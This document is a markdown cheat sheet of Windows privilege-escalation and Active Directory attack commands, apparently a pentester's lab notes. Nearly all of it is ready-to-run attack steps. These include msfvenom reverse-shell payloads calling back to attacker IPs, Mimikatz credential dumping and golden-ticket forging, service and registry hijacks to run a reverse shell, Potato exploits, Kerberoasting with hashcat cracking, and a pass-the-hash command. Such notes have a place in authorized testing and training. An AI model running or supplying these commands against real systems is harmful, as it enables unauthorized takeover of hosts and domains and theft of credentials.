# Privesc

## Powerview

Start Powershell - powershell -ep bypass -ep bypasses the execution policy of powershell allowing you to easily run scripts

```
powershell -ep bypass
```

Start PowerView

```
. .\PowerView.ps1
```

Enumerate the domain users -

```
Get-NetUser | select cn
```

Enumerate the domain groups

```
Get-NetGroup -GroupName *admin*
```

Additional queries

https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

## PowerUp a powershell script

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:

```
powershell -exec bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

This script is useful but requires PowerShell. If you are to use this script I advise using a one-off PowerShell command. For example:

```
powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.27.83 LPORT=4443 -e x86/sjikata -
f exe -o Advanced.exe
```

Encoded payload

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai
LHOST=10.11.9.134 LPORT=9091 -f exe -o bruce.exe
```

## Sherlock PowerShell script exploit suggester

Edit Sherlock.ps1 file and add line at the end.

```
...
Find-AllVulns
```

## BloodHound

```
neo4j console
bloodhound
```

```
powershell -ep bypass

.\Downloads\SharpHound.ps1

Invoke-Bloodhound -CollectionMethod All -Domain DOMAIN.local -ZipFileName loot.zip
```

Upload zip file into bloodhound.

## Mimikatz

Load mimikatz.

```
privilege::debug
```

Ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator

Dump hashes

```
lsadump::lsa /patch
```

Take hashes offline and crack the hashes

### Golden Ticket

Load mimikatz.

```
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

Copy the SID of the domain and the NTLM hash of the ticket granting ticket account

```
kerberos::golden /User:Administrator /domain:marvel.local /sid:SID /krbtgt:NTLMHASH /id:500 /ptt

After passing the ticket successfuly open a new session (on the mimikatz prompt)

misc::cmd
```

## Service Exploits

Let's start by looking for non-default services:

```
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```

```
To verify service permissions

.\accesschk.exe /accepteula -uwcqv user daclsvc

Query service configuration

sc qc daclsvc

Check service status

sc query daclsvc

```

### Unquoted Path Service

```
To check permissions to start the service
.\accesschk.exe /accepteula -ucqv user unquotedsvc

Check folder for write permissions

.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

Exploit
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.149.131 LPORT=9002 -f exe > Wise.exe

or

powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"

Paste exploit in that directory
net start unquotedsvc
```

### Weak Registry Permissions

If we can modify the registry of a service. Ex: HKLM\system\currentcontrolset\services\regsvc

Check permissions

```
.\accesschk.exe /accepteula -uvwqk HKLM\system\currentcontrolset\services\regsvc

Check the value of the registry entry

reg query HKLM\system\currentcontrolset\services\regsvc

Change the path of the value to a reverse shell

reg add HKLM\system\currentcontrolset\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

net start regsvc
```

### Startup Apps

```
.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

Check for Write access.

Create a shortcut to the exploit. There is a script already available in the privesc files.
type CreateShortcut.vbs
cscript CreateShortcut.vbs

Start listener

Logout and Log back in as the admin user.

icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
If the group has full access (F) then we simply upload a rev shell on this folder and wait for a login/reboot.

```

### Insecure Service Executables

```
.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

To check permissions to start the service

.\accesschk.exe /accepteula -ucqv user filepermsvc

Backup the original service executable

copy  "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp

copy /Y C:\PrivEsc\reverse.exe  "C:\Program Files\File Permissions Service\filepermservice.exe"

net start filepermsvc
```

### Escalation via binary paths

```
.\accesschk.exe /accepteula -uwcv Everyone *

To check permissions to start the service and change the config (SERVICE_QUERY_CONFIG)

.\accesschk.exe /accepteula -uwcv daclsvc  (name of the service found)

See current configuration

sc qc daclsvc

sc config daclsvc binpath="net localgroup admnistrators user /a"

sc stop daclsvc

sc start daclsvc
```

### DLL Hijacking

Check for folders that are writable and in the PATH

Check for the executables

```
sc qc dllsvc
```

Start Procmon to analyse .exe

Check what dll the .exe is calling

```
Generate a reverse shell

msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=9001 -f dll -o /tools/hijackme.dll

copy \\192.168.1.11\tools\hijackme.dll C:\Temp

net stop dllsvc
net start dllsvc
```

## Registry exploits

### AutoRuns

```
winPEAS.exe quiet applicationsinfo

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

Copy exploit to path of the .exe

Restart windows
```

### Always Install Elevated

```
winPEAS.exe quiet windowscreds

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

msfvenom -p windows/meterpreter/reverse_tcp lhost=(ATTACKER IP ADDRESS) lport=(ATTACKER PORT) –f  msi > install.msi
msiexec /quiet /qn /i  install.msi
```

## Scheduled Tasks

```
schtasks /query /fo LIST /v

Find script that is being executed and write to it

echo C:\PrivEsc\reverse.exe >> CleanUp.ps1
```

## Runas (Stored Credentials)

Identifying Stored Credentials

```
cmdkey /list

runas /savecred /user:WORKGROUP\Administrator "C:\Users\ignite\Downloads\shell.exe"
```

## Token Impersonation with Incognito

```
msfconsole
user windows/smb/psexec
set rhosts
set smbdomain
set smbpass
set smbuser
show targets
set payload windows/x64/meterpreter/reverse_tcp
set lhost
```

On a meterpreter shell load incognito

```
load incognito
list_tokens -u
impersonate_token token\name
rev2self on meterpreter (reverts back to the initial permissions)
```

## Hot Potato

Needs hot potato.exe

```
.\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_http server true -enable_defender true -enable_spoof true -enable_exhaust true
```

## Juicy Potato

Needs hot potato.exe

```
pwd of the reverse.exe
.\PSExec64.exe -accepteula -i -u "nt authority\local service" reverse.exe

To have a shell as the local service account

C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03... CLSID of the Windows version}
```

https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato

## Kerberoasting

ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

Impacket has a tool called "GetNPUsers.py" (located in Impacket/Examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. (Enumerate valid users with kerbrute)

```
GetNPUsers.py spookysec.local/ -usersfile userlist.txt

GetNPUsers.py spookysec.local/svc-admin -no-pass
```

Once we have user credentials we can retrieve services with administrator accounts (SPN)

Using the GetUserSPNS.py (impacket)

```
GetUserSPNS.py domain.local/user:password -dc-ip 192.168.57.140 -request
GetUserSPNS.py -request -dc-ip IP TARGET(domain/user)

impacket-GetUsersSPNs -dc-ip IP DOMAIN/User
Enter the password
```

Or

```
GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.117.212 -request
```

Find hashcat hash type

```
hashcat --1 help | grep Kerberos
hashcat -m 13100 hashes4.txt rockyou.txt -O
```

## Abusing Token Privileges For Windows Local Privilege Escalation

While using meterpreter

ps shows all of the running processes

```
meterpreter > migrate PID
to migrate to a higher authority process(ex: spoolsv.exe)

meterpreter > load kiwi
to load mimikatz
```

TODO: Good reads

https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/

## Windows-Exploit-Suggester

update the database

```
$ ./windows-exploit-suggester.py --update
```

install dependencies

(install python-xlrd, \$ pip install xlrd --upgrade)

feed it "systeminfo" input, and point it to the microsoft database

```
$ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
```

[Windows-Exploit-Suggester GitHub](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

## Pass the hash attack

```
pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //IP cmd.exe
```

## Privilege Escalation Awesome Scripts SUITE

[GitHub - carlospolop/privilege-escalation-awesome-scripts-suite: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

## Additional reading

FuzzySecurity | Windows Privilege Escalation Fundamentals

[FuzzySecurity | Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)[FuzzySecurity | Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)

Windows Privilege Escalation Guide

[Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
